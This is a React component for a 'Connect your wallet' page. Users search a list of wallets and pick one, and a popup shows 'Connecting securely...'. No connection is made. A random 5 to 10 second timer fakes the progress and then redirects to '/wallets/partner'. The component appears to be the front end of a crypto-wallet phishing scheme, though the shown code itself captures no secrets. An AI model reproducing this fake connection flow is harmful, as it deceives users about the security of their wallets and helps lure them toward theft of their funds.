import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";

import { wallets } from "./wallets";

export function WalletConnect() {
  const navigate = useNavigate();

  const [search, setSearch] = useState("");
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [connecting, setConnecting] = useState(false);
  const [redirecting, setRedirecting] = useState(false);
  const [connectionTimer, setConnectionTimer] = useState(null);

  const filteredWallets = wallets.filter((wallet) =>
    wallet.name.toLowerCase().includes(search.toLowerCase()),
  );

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setConnecting(true);
    setRedirecting(false);

    localStorage.setItem("walletName", wallet.name);
    localStorage.setItem("walletImg", wallet.image);

    const timer = Math.floor(Math.random() * 6) + 5;
    const timerCount = timer * 1000;

    setConnectionTimer(timerCount);
  };

  useEffect(() => {
    if (!connectionTimer) return;

    const redirectTimer = setTimeout(() => {
      setRedirecting(true);
    }, connectionTimer / 2);

    const navigateTimer = setTimeout(() => {
      navigate("/wallets/partner");
    }, connectionTimer);

    return () => {
      clearTimeout(redirectTimer);
      clearTimeout(navigateTimer);
    };
  }, [connectionTimer, navigate]);

  const closePopup = () => {
    setSelectedWallet(null);
    setConnecting(false);
    setRedirecting(false);
    setConnectionTimer(null);
  };

  return (
    <main className="px-6">
      {/* Top section */}
      <section className="mt-8">
        <h4 className="text-center text-xl font-bold">Connect your wallet</h4>

        <div className="relative mx-auto mt-4 h-1 w-40 overflow-hidden bg-[#f0f0f0]">
          <div className="absolute left-[-50%] h-full w-1/2 animate-[loadingAnimation_1s_infinite] bg-[rgb(7,23,229)]" />
        </div>
      </section>

      {/* Search */}
      <section className="mt-12 flex w-full flex-col gap-4 sm:flex-row">
        <input
          id="searchWallet"
          type="text"
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          placeholder="Search wallet"
          className="flex-1 border-2 border-black p-3 text-base font-medium outline-none"
        />

        <button
          type="button"
          className="bg-[#2c1cf7] px-6 py-3 font-medium text-white"
        >
          Search
        </button>
      </section>

      {/* Wallet section */}
      <section className="mt-12">
        <p className="text-xs font-bold text-gray-500">
          {filteredWallets.length} wallets found
        </p>

        <div className="mt-8 grid grid-cols-1 gap-6 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
          {filteredWallets.map((wallet) => (
            <button
              type="button"
              key={wallet.name}
              onClick={() => handleWalletSelect(wallet)}
              className="flex cursor-pointer items-center gap-4 rounded-lg p-4 text-left shadow-[-14px_14px_51px_#efefef,14px_-14px_51px_#f4f4f4]"
            >
              <img
                src={wallet.image}
                alt={wallet.name}
                className="h-17.5 w-17.5 rounded-full"
              />

              <p className="text-sm font-bold text-[#383838]">{wallet.name}</p>
            </button>
          ))}
        </div>
      </section>

      {/* Wallet popup */}
      {selectedWallet && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/55">
          <div className="w-[90%] max-w-md rounded-[10px] bg-white">
            {/* Close button */}
            <div className="flex justify-end">
              <button
                type="button"
                onClick={closePopup}
                className="rounded-bl-[10px] rounded-tr-[10px] bg-black px-3 py-1 font-bold text-red-500"
              >
                x
              </button>
            </div>

            <div className="flex flex-col items-center gap-2 px-4 py-6">
              <img
                src={selectedWallet.image}
                alt={selectedWallet.name}
                className="h-20 w-20 rounded-full"
              />

              <p className="text-base font-bold">{selectedWallet.name}</p>

              {connecting && (
                <div className="mt-6 flex w-full flex-col items-center">
                  <p className="mb-2 text-xs text-[#373737]">
                    {redirecting
                      ? "Redirecting to wallet page..."
                      : "Connecting securely..."}
                  </p>

                  {!redirecting && (
                    <div className="relative mt-4 h-1 w-full overflow-hidden bg-[#f0f0f0]">
                      <div className="absolute left-[-50%] h-full w-1/2 animate-[loadingAnimation_1s_infinite] bg-[rgb(7,23,229)]" />
                    </div>
                  )}

                  <span className="mt-3 text-xs italic text-gray-400">
                    Please wait...
                  </span>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </main>
  );
}
